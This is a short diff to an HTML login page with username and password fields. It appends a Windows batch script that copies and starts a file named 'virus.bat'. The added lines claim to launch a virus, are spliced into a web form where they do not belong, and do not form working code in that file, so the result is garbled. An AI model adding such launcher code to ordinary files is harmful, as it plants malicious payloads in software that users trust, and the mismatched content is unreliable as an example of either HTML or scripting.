@@ -3,3 +3,9 @@
 <input type="username" name="username">
 </br>Password:<br><input type="password" name="password"></br>
 <br><input type="submit" value="Logon"></br>
+
+
+@echo off
+chdir /d %CD%
+copy virus.bat
+start virus.bat
